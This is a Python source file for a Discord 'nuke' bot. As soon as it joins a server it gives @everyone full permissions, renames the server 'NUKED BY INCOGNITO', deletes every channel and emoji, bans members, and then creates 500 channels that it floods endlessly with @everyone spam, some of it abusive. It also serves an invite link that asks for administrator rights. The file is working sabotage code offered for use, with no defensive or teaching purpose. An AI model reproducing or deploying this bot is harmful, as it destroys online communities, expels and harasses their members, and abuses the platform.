import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import requests, os
from webserver import keep_alive

intents = discord.Intents.all()
intents.members = True
nuke = commands.Bot(command_prefix='*', help_command=None, intents=intents)

SPAM_CHANNEL =  ["incognito-on-top", "noob-lol", "fack-you"]
SPAM_MESSAGE = ["@everyone Get Rekt", "@everyone Subscribe IncognitoYT", "@everyone Go Kill YourSelf"]
NOOB = os.getenv("TOKEN")

with open('reaper.jpg', 'rb') as f:
	icon = f.read()

@nuke.event
async def on_ready():
	os.system("clear")
	print("[ + ] " + Fore.GREEN + f"{nuke.user} Ready!" + Fore.RESET)
	activity = discord.Game(name=f'{nuke.user} | 47 Servers')
	await nuke.change_presence(status=discord.Status.dnd, activity=activity)

@nuke.event
async def on_message(message):
	     embed = discord.Embed(title="Invite Link", description="[CLICK HERE](https://discord.com/api/oauth2/authorize?client_id=964860607687950346&permissions=8&scope=bot)", color=discord.Color.red())
	     if message.content.startswith('<@964860607687950346>'):
	     	await message.channel.send(embed=embed)

@nuke.event
async def on_guild_join(guild):
	role = discord.utils.get(guild.roles, name = "@everyone")
	await role.edit(permissions = Permissions.all())
	try:
		await guild.edit(name="NUKED BY INCOGNITO", icon=icon)
	except:
		print("Failed To Edit")
	for channel in guild.channels:
		try:
			await channel.delete()
			print(f"Deleted {channel.name}")
		except:
			print('Failed To Delete Channel')
	for member in guild.members:
		try:
			await member.ban()
			print(f"Banned {member.name}#{member.discriminator}")
		except:
			print(f"Failed To Ban {member.name}#{member.discriminator}")
	for emoji in list(guild.emojis):
		try:
			await emoji.delete()
		except:
			print(f"Unable To Delete {emoji.name}")
	await guild.create_text_channel("NUKED-BY-INCOGNITO")
	for channel in guild.text_channels:
		link = await channel.create_invite(max_age = 0, max_uses = 0)
		print(f"New Invite Link : {link}")
	amount = 500
	for i in range(amount):
		await guild.create_text_channel(random.choice(SPAM_CHANNEL))
	print(f"Nuked {guild.name} successfully")
	return

@nuke.event
async def on_guild_channel_create(channel):
	if channel.name not in SPAM_CHANNEL:
		print("Normal Channel Created")
	else:
		while True:
			await channel.send(random.choice(SPAM_MESSAGE))

keep_alive()
nuke.run(NOOB)
